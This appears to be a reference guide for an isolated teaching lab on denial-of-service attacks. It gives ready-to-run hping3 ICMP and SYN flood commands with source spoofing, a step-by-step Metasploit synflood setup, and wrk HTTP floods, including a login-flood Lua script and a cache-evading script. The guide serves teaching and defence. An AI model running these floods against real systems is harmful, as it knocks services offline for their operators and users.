# Attack Tools Reference — TrackShop DoS Lab

This document describes each tool used in the lab, including its purpose, installation, configuration options, and example commands.

---

## 1. hping3 — ICMP / TCP Packet Crafter

### Purpose

`hping3` is a command-line packet assembler and analyser for TCP/IP.  
It can craft and send custom packets at arbitrary rates, making it well-suited for demonstrating ICMP flood and TCP SYN flood attacks at the network and transport layers.

### Key Capabilities

| Feature | Description |
|---------|-------------|
| Protocol modes | ICMP, TCP, UDP, raw IP |
| `--flood` | Send packets as fast as the CPU allows |
| IP spoofing | `--rand-source` or `--spoof <ip>` |
| Payload control | Set flags, TTL, window size, data length |

### Installation

```bash
# Kali Linux / Debian / Ubuntu
sudo apt-get update && sudo apt-get install -y hping3

# Verify
hping3 --version
```

### Important Flags

| Flag | Meaning |
|------|---------|
| `--icmp` | Send ICMP Echo Request (ping) packets |
| `--tcp` (default) | Send TCP packets |
| `--udp` | Send UDP packets |
| `--flood` | Maximum send rate (no inter-packet delay) |
| `-S` | Set TCP SYN flag |
| `--rand-source` | Randomise source IP for each packet |
| `--spoof <ip>` | Set a fixed spoofed source IP |
| `-V` | Verbose: print sent/received counters |
| `-p <port>` | Set destination port |
| `-d <bytes>` | Add a data payload of N bytes |
| `-i u<microsecs>` | Inter-packet interval (e.g., `-i u100` = 100 µs) |

### Example Commands

```bash
# ── ICMP flood (Network Layer DoS) ──────────────────────────────────────────
# Send ICMP Echo Requests at full speed — requires root
sudo hping3 --icmp --flood -V 172.28.0.30

# ICMP flood with 1000-byte payload (larger packets, more bandwidth)
sudo hping3 --icmp --flood -V -d 1000 172.28.0.30

# Rate-limited ICMP flood (100 packets/second for observation)
sudo hping3 --icmp -i u10000 -V 172.28.0.30
# (-i u10000  = one packet every 10 000 µs = 100 pps)

# ── TCP SYN flood (Transport Layer DoS) ─────────────────────────────────────
# SYN flood on port 80 with random source IPs
sudo hping3 -S --flood --rand-source -p 80 172.28.0.30

# SYN flood with fixed spoofed source
sudo hping3 -S --flood --spoof 10.0.0.1 -p 80 172.28.0.30
```

> **Note:** `hping3` SYN floods can also be used in the transport-layer exercise, but the lab uses Metasploit for a more controlled / observable demonstration.

### Monitoring During hping3 Attack

```bash
# Watch network statistics inside the target container
docker exec dos_lab_nginx bash -c \
  "cat /proc/net/dev | grep eth0"

# Monitor with watch (updates every second)
watch -n 1 "docker exec dos_lab_nginx bash -c \
  \"cat /proc/net/dev | grep eth0\""

# CPU % of the container
docker stats dos_lab_nginx --no-stream
```

---

## 2. Metasploit Framework — SYN Flood Module

### Purpose

Metasploit is an open-source penetration testing framework with a module library covering exploits, auxiliary tools, payloads, and post-exploitation capabilities.  
For this lab we use the **`auxiliary/dos/tcp/synflood`** module, which performs a configurable TCP SYN flood.

### Key Advantages Over hping3 For This Exercise

- **Threading** — runs multiple flood threads simultaneously via `NUM_THREADS`.
- **Source randomisation** — built-in random source IP mode (`SHOST RND`).
- **Controlled duration** — integrates with Metasploit's run/stop control flow.

### Installation

```bash
# Kali Linux (pre-installed)
msfconsole --version

# Debian / Ubuntu (not pre-installed)
sudo apt-get install -y metasploit-framework

# Update modules
sudo msfupdate
```

### Module Reference: `auxiliary/dos/tcp/synflood`

| Option | Default | Description |
|--------|---------|-------------|
| `RHOST` | — | Target IP address (required) |
| `RPORT` | 80 | Target port |
| `SHOST` | `RND` | Source IP (`RND` = random spoofed) |
| `SPORT` | 0 | Source port (0 = random) |
| `NUM_THREADS` | 1 | Attack threads |
| `TIMEOUT` | 0 | Stop after N seconds (0 = manual stop) |

### Step-by-Step Usage

```bash
# 1. Start msfconsole (quiet mode)
sudo msfconsole -q

# 2. Load the module
msf6 > use auxiliary/dos/tcp/synflood

# 3. Show all options
msf6 auxiliary(dos/tcp/synflood) > show options

# 4. Configure target
msf6 auxiliary(dos/tcp/synflood) > set RHOST 172.28.0.30
msf6 auxiliary(dos/tcp/synflood) > set RPORT 80

# 5. Randomise source IP (simulate distributed attack)
msf6 auxiliary(dos/tcp/synflood) > set SHOST RND

# 6. Use 4 flood threads
msf6 auxiliary(dos/tcp/synflood) > set NUM_THREADS 4

# 7. Start (Ctrl-C or 'stop' to halt)
msf6 auxiliary(dos/tcp/synflood) > run

# 8. Stop
msf6 auxiliary(dos/tcp/synflood) > stop
```

### Observing the Attack

```bash
# Count half-open connections inside the nginx container
docker exec dos_lab_nginx bash -c \
  "apt-get install -yq iproute2 2>/dev/null; ss -ant | grep SYN_RECV | wc -l"

# Continuous watch (run in a separate terminal)
watch -n 1 "docker exec dos_lab_nginx bash -c \
  \"ss -ant | grep SYN_RECV | wc -l\""

# Try a legitimate request to confirm impact
curl --max-time 5 http://172.28.0.30/api/health
```

### How SYN Cookies Work (For Reference)

When **SYN cookies are enabled** (`tcp_syncookies=1`):

1. The server encodes connection parameters into the initial sequence number (ISN) of the SYN-ACK.
2. **No backlog entry is created** for the SYN.
3. When (and only if) the final ACK arrives, the server decodes the ISN to reconstruct state.
4. Spoofed SYNs that never send an ACK cost the server nothing.

This lab **disables** SYN cookies so the backlog exhaustion vulnerability is demonstrable.

---

## 3. wrk — HTTP Benchmarking / Flood Tool

### Purpose

`wrk` is a modern HTTP/1.1 benchmarking tool capable of generating significant HTTP load from a single machine using event-driven I/O (via `epoll`/`kqueue`) and the `LuaJIT` scripting engine for custom request logic.

In the context of this lab it simulates a high-rate HTTP flood against the application endpoints.

### Key Features

| Feature | Description |
|---------|-------------|
| Multi-threaded | `-t N` OS threads handle connections |
| High concurrency | `-c N` simultaneous connections per run |
| Duration control | `-d Ns` run for N seconds |
| Lua scripting | `--script` for custom headers, methods, bodies |
| Latency stats | Reports p50 / p75 / p99 / max latency |

### Installation

```bash
# Kali Linux / Debian / Ubuntu
sudo apt-get update && sudo apt-get install -y wrk

# From source (if not in apt)
sudo apt-get install -y build-essential libssl-dev git
git clone https://github.com/wg/wrk.git && cd wrk && make
sudo cp wrk /usr/local/bin/

# Verify
wrk --version
```

### Command Syntax

```
wrk [options] <URL>

Options:
  -t <N>      Number of threads
  -c <N>      Total concurrent connections
  -d <T>      Duration (e.g., 30s, 2m)
  -H <header> Add an HTTP header
  --script    Path to a Lua script
  --latency   Print detailed latency distribution
  --timeout   Per-request timeout
```

### Rule of Thumb for Thread/Connection Settings

| Goal | `-t` | `-c` |
|------|------|------|
| Light observation | 2 | 20 |
| Moderate load | 4 | 100 |
| Heavy flood | 8 | 400 |

Connection count (`-c`) should always be >> thread count (`-t`).

### Example Commands for This Lab

```bash
export TARGET=172.28.0.30

# ── Search endpoint — moderate ────────────────────────────────────────────
wrk -t 4 -c 100 -d 60s --latency \
  "http://$TARGET/api/search?q=wireless"

# ── Search endpoint — heavy ───────────────────────────────────────────────
wrk -t 4 -c 200 -d 60s --latency \
  "http://$TARGET/api/search?q=a"

# ── Reports endpoint (highest CPU impact) ────────────────────────────────
wrk -t 4 -c 100 -d 60s --latency \
  "http://$TARGET/api/reports"

# ── Orders endpoint (N+1 DB amplification) ───────────────────────────────
wrk -t 8 -c 200 -d 60s --latency \
  "http://$TARGET/api/orders"

# ── Login endpoint — credential stuffing flood ────────────────────────────
# POST requests using a Lua script
cat > /tmp/login_flood.lua << 'EOF'
wrk.method = "POST"
wrk.headers["Content-Type"] = "application/json"
wrk.body = '{"username":"admin","password":"admin123"}'
EOF

wrk -t 4 -c 100 -d 60s --script /tmp/login_flood.lua \
  "http://$TARGET/api/login"
```

### Reading `wrk` Output

```
Running 60s test @ http://172.28.0.30/api/reports
  4 threads and 100 connections

  Thread Stats   Avg      Stdev     Max
    Latency      3.42s    1.87s   15.00s    ← high latency = server struggling
    Req/Sec      8.50      6.11    50.00     ← low throughput

  Latency Distribution
     50%    3.02s
     75%    4.50s
     99%   12.30s                            ← p99 > 10 s = severe degradation
    100%   15.00s

  1890 requests in 60.09s, 2.34MB read
  Socket errors: connect 0, read 0, write 0, timeout 234  ← timeouts!
  Requests/sec:  31.45
  Transfer/sec:  39.98KB
```

**Key indicators of successful DoS:**

- `Latency Avg` > 1–2 seconds
- `Req/Sec` dropping to single digits
- `timeout` socket errors increasing
- `docker stats` showing CPU near 100 %

### Lua Scripting Examples

```lua
-- Rotate query strings to defeat simple caching
local queries = {"wireless", "keyboard", "storage", "laptop", "cable"}
local counter = 0

request = function()
  counter = counter + 1
  local q = queries[(counter % #queries) + 1]
  return wrk.format(nil, "/api/search?q=" .. q)
end
```

```bash
wrk -t 4 -c 200 -d 60s --script /tmp/rotate.lua \
  "http://$TARGET/api/search"
```

---

## Quick Reference — Tool Comparison

| Tool | Layer | Protocol | Primary Resource Targeted |
|------|-------|----------|--------------------------|
| `hping3 --icmp --flood` | Network (L3) | ICMP | Bandwidth, CPU interrupt |
| `hping3 -S --flood` | Transport (L4) | TCP | Connection backlog |
| Metasploit `synflood` | Transport (L4) | TCP | Connection backlog |
| `wrk` | Application (L7) | HTTP | CPU, DB connections, memory |

---

*TrackShop DoS Lab — for educational use only. Never use these tools outside your isolated lab or without explicit written permission.*
